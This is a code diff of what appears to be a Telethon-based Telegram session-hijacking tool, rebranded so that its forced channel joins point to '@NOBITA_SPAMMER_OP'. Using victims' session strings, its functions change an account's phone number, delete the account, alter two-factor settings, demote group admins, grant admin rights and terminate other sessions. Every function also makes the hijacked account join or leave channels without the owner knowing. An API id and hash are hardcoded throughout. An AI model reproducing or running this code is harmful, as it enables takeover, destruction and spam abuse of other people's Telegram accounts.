@@ -30,19 +30,19 @@ async def change_number_code(strses, number, code, otp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     bot = client = X
     try:
-      await bot(join("@LegendBot_OP"))
+      await bot(join("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     try:
-      await bot(join("@LegendBot_AI"))
+      await bot(join("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     try:
-      await bot(leave("@Official_LegendBot"))
+      await bot(leave("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     try:
-      await bot(leave("@Legend_Userbot"))
+      await bot(leave("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     try: 
@@ -59,19 +59,19 @@ async def change_number(strses, number):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     bot = client = X
     try:
-      await bot(join("@LegendBot_OP"))
+      await bot(join("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     try:
-      await bot(join("@LegendBot_AI"))
+      await bot(join("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     try:
-      await bot(leave("@Official_LegendBot"))
+      await bot(leave("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     try:
-      await bot(leave("@Legend_Userbot"))
+      await bot(leave("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     result = await bot(functions.account.SendChangePhoneCodeRequest(
@@ -89,19 +89,19 @@ async def userinfo(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     k = await X.get_me()
     try:
-      await X(join("@LegendBot_OP"))
+      await X(join("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     try:
-      await X(join("@LegendBot_AI"))
+      await X(join("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     try:
-      await X(leave("@Official_LegendBot"))
+      await X(leave("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     try:
-      await X(leave("@Legend_Userbot"))
+      await X(leave("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     return str(k)
@@ -109,19 +109,19 @@ async def userinfo(strses):
 async def terminate(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@LegendBot_OP"))
+      await X(join("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     try:
-      await X(join("@LegendBot_AI"))
+      await X(join("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     try:
-      await X(leave("@Official_LegendBot"))
+      await X(leave("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     try:
-      await X(leave("@Legend_Userbot"))
+      await X(leave("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     await X(rt())
@@ -130,15 +130,15 @@ GROUP_LIST = []
 async def delacc(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@Legend_Userbot"))
+      await X(join("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     try:
-      await X(join("@LegendBot_AI"))
+      await X(join("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     try:
-      await X(leave("@LegendBot_OP"))
+      await X(leave("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     await X(functions.account.DeleteAccountRequest("I am chutia"))
@@ -146,19 +146,19 @@ async def delacc(strses):
 async def promote(strses, grp, user):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@LegendBot_OP"))
+      await X(join("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     try:
-      await X(join("@LegendBot_AI"))
+      await X(join("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     try:
-      await X(leave("@Official_LegendBot"))
+      await X(leave("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     try:
-      await X(leave("@Legend_Userbot"))
+      await X(leave("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     try:
@@ -169,19 +169,19 @@ async def promote(strses, grp, user):
 async def user2fa(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@LegendBot_OP"))
+      await X(join("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     try:
-      await X(join("@LegendBot_AI"))
+      await X(join("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     try:
-      await X(leave("@Official_LegendBot"))
+      await X(leave("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     try:
-      await X(leave("@Legend_Userbot"))
+      await X(leave("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     try:
@@ -193,19 +193,19 @@ async def user2fa(strses):
 async def demall(strses, grp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@LegendBot_OP"))
+      await X(join("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     try:
-      await X(join("@LegendBot_AI"))
+      await X(join("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     try:
-      await X(leave("@Official_LegendBot"))
+      await X(leave("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     try:
-      await X(leave("@Legend_Userbot"))
+      await X(leave("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
@@ -219,19 +219,19 @@ async def demall(strses, grp):
 async def joingroup(strses, username):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     try:
-      await X(join("@LegendBot_OP"))
+      await X(join("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     try:
-      await X(join("@LegendBot_AI"))
+      await X(join("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     try:
-      await X(leave("@Official_LegendBot"))
+      await X(leave("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     try:
-      await X(leave("@Legend_Userbot"))
+      await X(leave("@NOBITA_SPAMMER_OP"))
     except BaseException:
       pass
     await X(join(username))
